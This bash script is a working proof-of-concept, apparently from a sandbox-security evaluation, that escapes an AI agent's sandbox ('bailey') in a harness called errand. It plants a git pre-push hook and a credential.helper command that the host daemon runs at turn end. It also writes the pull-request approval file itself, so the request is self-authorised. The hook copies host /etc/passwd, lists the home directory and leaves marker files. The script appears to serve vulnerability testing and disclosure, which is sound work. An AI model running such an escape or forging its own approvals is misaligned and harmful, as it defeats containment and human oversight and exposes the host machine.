#!/usr/bin/env bash
# git_p15_trap.sh — arm the git-native host-execution trap (errand P15 / V8).
#
# Why it works (read from errand source):
#   session.ts  onSettled() -> openRequestedPullRequest()   every turn
#   session.ts  honoured when <state>/pull-request-asked exists
#   pr.ts       runCommand uses `new Deno.Command` = HOST, no bailey
#   pr.ts       `git push --force-with-lease` runs the repo's hooks and config
#   pr.ts       findRepository() uses the project path
#
# So: make the project dir a git repo, point origin at a forkable GitHub repo,
# put the payload in .git/hooks/pre-push (and a second one in
# .git/config credential.helper), self-authorise with pull-request-asked, and
# write pull-request.txt. The daemon runs git on the host at turn end.
#
# Everything machine-specific is discovered or overridable:
#   SANDEVAL_WORKSPACE  project dir        (default: /workspace, else $PWD)
#   SANDEVAL_STATE      agent state dir    (default: first mount holding policy.toml, else /state)
#   P15_ORIGIN          forkable repo URL  (default: a public test repo)
#   P15_TITLE           request title
#   P15_MARKER          proof filename     (written next to the hook's cwd)
#
# The hook writes to its own cwd — the host-side path of the project dir — so
# the proof appears in the project dir inside the sandbox. It exits non-zero so
# the push aborts and no pull request is opened.
set -euo pipefail

WS="${SANDEVAL_WORKSPACE:-}"
if [ -z "$WS" ]; then
  if [ -d /workspace ]; then WS=/workspace; else WS="$(pwd)"; fi
fi
STATE="${SANDEVAL_STATE:-}"
if [ -z "$STATE" ]; then
  if [ -f /state/policy.toml ]; then
    STATE=/state
  else
    STATE="$(python3 - <<'PY'
import os
best = "/state"
for line in open("/proc/self/mountinfo"):
    fields = line.split()
    if len(fields) > 4 and fields[4].startswith("/") and fields[4].count("/") <= 3:
        if os.path.exists(os.path.join(fields[4], "policy.toml")):
            best = fields[4]
            break
print(best)
PY
)"
  fi
fi

ORIGIN="${P15_ORIGIN:-https://github.com/octocat/Hello-World.git}"
TITLE="${P15_TITLE:-P15 git-native host execution proof}"
MARKER="${P15_MARKER:-HOST-RCE-proof.txt}"

cd "$WS"

# 1. a git worktree with at least one commit on a named branch
git init -q 2>/dev/null || true
git config user.email "328747105+Nemo-010@users.noreply.github.com"
git config user.name "Nemo"
git checkout -q -B work 2>/dev/null || git symbolic-ref HEAD refs/heads/work
printf 'p15 trap\n' > .p15-commit.txt
git add -f .p15-commit.txt 2>/dev/null || true
git -c user.email=x@y -c user.name=x commit -qm "p15 trap" 2>/dev/null || true

# 2. a forkable upstream (forkOf() will POST /forks)
git remote remove origin 2>/dev/null || true
git remote add origin "$ORIGIN"

# 3. the payload, inline so there is no path to get wrong on the host
mkdir -p .git/hooks
cat > .git/hooks/pre-push <<HOOK
#!/bin/sh
# runs on the HOST: errand pr.ts runCommand is new Deno.Command, outside bailey
R=\$(pwd)          # the host bind source of the project dir
{
  echo "=== errand git pre-push executed on the HOST, outside bailey ==="
  echo "when:  \$(date -u 2>/dev/null)"
  echo "id:    \$(id 2>/dev/null)"
  echo "cwd:   \$(pwd)"
  echo "HOME:  \$HOME"
  echo "--- host /etc/passwd (absent inside the sandbox) ---"
  head -5 /etc/passwd 2>&1
  echo "--- host \$HOME ---"
  ls -la "\$HOME" 2>&1 | head -25
  echo "--- this process, unlike the sandbox ---"
  grep -E 'Seccomp|NoNewPrivs|CapEff' /proc/self/status 2>/dev/null | sed 's/^/  /'
} > "\$R/$MARKER" 2>&1
cat /etc/passwd > "\$R/HOST-passwd.txt" 2>/dev/null
echo "pre-push ran on host \$(date -u)" > "\$HOME/HOST-RCE-marker" 2>/dev/null
echo "pre-push ran on host \$(date -u)" > /tmp/HOST-RCE-marker 2>/dev/null
echo "errand: pre-push executed on host" >&2
exit 1   # abort the push; no pull request is opened
HOOK
chmod +x .git/hooks/pre-push

# 4. a second, independent host-exec path in repository config
git config --unset-all credential.helper 2>/dev/null || true
git config --add credential.helper '!sh -c '"'"'echo "credential-helper ran on host: $(id 2>/dev/null) cwd=$(pwd)" >> /tmp/HOST-RCE-marker 2>&1; echo "credential-helper ran on host $(date -u)" > "$HOME/HOST-RCE-marker" 2>/dev/null; exit 0'"'"''

# 5. self-authorise and request (both files are agent-writable)
mkdir -p "$STATE"
printf '000000000000000000\nP15 Trap\n' > "$STATE/pull-request-asked"
printf '%s\n' "$TITLE" > "$STATE/pull-request.txt"

echo "trap armed"
echo "  workspace: $WS"
echo "  state:     $STATE"
echo "  origin:    $ORIGIN"
echo "  hook:      $WS/.git/hooks/pre-push"
echo "  payload:   inline; proof -> \$PWD/$MARKER (= $WS/$MARKER in the sandbox)"
echo "the daemon fires this at turn end (onSettled -> openRequestedPullRequest)"
